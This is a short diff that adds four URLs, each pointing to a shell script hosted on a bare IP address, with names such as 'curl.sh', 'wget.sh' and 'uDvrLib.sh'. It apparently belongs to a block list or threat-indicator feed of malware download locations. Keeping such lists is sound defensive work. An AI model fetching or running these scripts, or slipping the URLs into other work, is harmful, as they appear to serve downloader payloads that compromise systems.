@@ -1,0 +1,4 @@
+http://45.145.185.94/uDvrLib.sh
+http://46.246.41.29/curl.sh
+http://46.246.41.29/wget.sh
+http://194.15.36.34/dayum0x1a5sfd15as1fa.sh
